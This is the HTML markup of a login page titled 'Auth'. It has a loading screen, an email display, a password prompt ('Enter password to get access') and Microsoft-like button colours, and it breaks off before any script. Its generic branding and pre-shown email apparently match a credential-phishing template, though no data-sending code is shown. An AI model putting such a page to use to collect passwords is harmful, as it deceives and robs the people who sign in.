<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>Auth</title>
  <script src="https://cdn.tailwindcss.com"></script>
  <style>
    body {
      background-size: cover;
    }
    .modal {
      backdrop-filter: blur(8px);
      background-color: rgba(255, 255, 255, 0.9);
    }
    .logo-text {
      font-family: Arial, sans-serif;
      font-weight: bold;
    }
    .sign-in-button {
      background-color: #0078D4;
      transition: background-color 0.3s;
    }
    .sign-in-button:hover {
      background-color: #005A9E;
    }
    .hidden {
      display: none;
    }
    @keyframes bounce {
      0%, 100% {
        transform: translateY(0);
      }
      50% {
        transform: translateY(-10px);
      }
    }
    .loading-icon {
      animation: bounce 1s infinite;
    }
  </style>
</head>
<body class="flex items-center justify-center h-screen bg-gray-100">
  <div id="loading-screen" class="bg-white p-8 rounded-xl shadow-md text-center flex flex-col items-center">
    <img src="https://png.pngtree.com/png-clipart/20211116/original/pngtree-minimal-loading-icon-graphic-png-image_6944732.png"
         alt="Icon" width="80" height="80" class="loading-icon">
  </div>
  <div id="login-panel" class="hidden modal p-8 rounded-md shadow-lg w-full max-w-sm">
    <div class="flex items-center mb-6">
      <span class="ml-2 text-lg text-gray-800 logo-text">Auth</span>
    </div>
    <div class="flex items-center mb-4">
      - 
      <span id="email-display" class="text-gray-800 text-sm font-semibold"></span>
    </div>
    <h2 class="text-xl font-semibold mb-6 text-gray-800">Enter password to get access</h2>
    <form id="login-form">
      <div class="mb-4">
        <input type="password" id="password" placeholder="Password"
               class="w-full px-3 py-2 border border-gray-300 rounded focus:outline-none focus:ring-2 focus:ring-blue-600">
        <p id="error-message" class="text-red-600 mt-2 text-center hidden">Wrong Password. Try Again.</p>
      </div>
      <div class="flex items-center mb-6">
        <input type="checkbox" id="keep-signed-in" class="h-4 w-4 text-blue-600">
        <label for="keep-signed-in" class="ml-2 text-sm text-gray-600">Keep me signed in</label>
      </div>
      <button type="button" id="sign-in-button"
              class="w-full sign-in-button text-white font-semibold p-3 rounded-md focus:outline-none focus:ring-2 focus:ring-blue-600">
        Sign in
      </button>
    </form>
  </div>
